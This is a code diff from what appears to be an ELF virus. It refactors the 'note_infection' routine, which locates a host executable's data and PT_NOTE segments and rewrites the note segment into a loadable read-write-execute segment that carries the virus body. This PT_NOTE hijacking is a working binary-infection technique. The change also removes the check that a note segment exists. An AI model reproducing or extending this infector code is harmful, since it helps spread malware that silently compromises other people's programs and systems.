@@ -29,21 +29,21 @@ __attribute__((always_inline)) static inline bool is_note_segment(const Elf64_Ph
 	return segment->p_type == PT_NOTE;
 }
 
-__attribute__((always_inline)) static inline void update_note_segment(struct s_note *note) 
+__attribute__((always_inline)) static inline void update_note_segment(Elf64_Phdr **segment) 
 {
-	const size_t base = note->data->p_vaddr + note->data->p_memsz;
-	const size_t add_padding = base % note->data->p_align;
+	const size_t base = segment[DATA]->p_vaddr + segment[DATA]->p_memsz;
+	const size_t padding = base % segment[DATA]->p_align;
 
-	note->self->p_vaddr = base + (note->data->p_align - add_padding);
-	note->self->p_paddr = note->self->p_vaddr;
-	note->self->p_offset = base - add_padding;
+	segment[NOTE]->p_vaddr = base + (segment[DATA]->p_align - padding);
+	segment[NOTE]->p_paddr = segment[NOTE]->p_vaddr;
+	segment[NOTE]->p_offset = base - padding;
 
-	note->self->p_filesz = (void *)__exit - (void *)__entry;
-	note->self->p_memsz = (void *)__exit - (void *)__entry;
+	segment[NOTE]->p_filesz = (void *)__exit - (void *)__entry;
+	segment[NOTE]->p_memsz = (void *)__exit - (void *)__entry;
 
-	note->self->p_type = PT_LOAD;
-	note->self->p_flags = (PF_X | PF_W | PF_R);
-	note->self->p_align = note->data->p_align;
+	segment[NOTE]->p_type = PT_LOAD;
+	segment[NOTE]->p_flags = (PF_X | PF_W | PF_R);
+	segment[NOTE]->p_align = segment[DATA]->p_align;
 }
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -61,7 +61,6 @@ void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 	if (context == FAILURE)
 		goto label;
 	
-	struct s_note note = {0};
 	Elf64_Phdr *segment = NULL;
 
 	for (register Elf64_Half index = 0; index < host->header->e_phnum; index++)
@@ -73,19 +72,18 @@ void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_con
 		}
 
 		if (is_data_segment(segment) == true)
-			note.data = segment;
+			host->segment[DATA] = segment;
 		if (is_note_segment(segment) == true)
-			note.self = segment;
+			host->segment[NOTE] = segment;
 	}
 	
-	if (segment == NULL || note.self == NULL)
+	if (segment == NULL)
 	{
 		context = FAILURE;
 		goto label;
 	}
 
-	update_note_segment(&note);
-	host->note = &note;
+	update_note_segment(host->segment);
 
 label:
 //	update_keychain_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
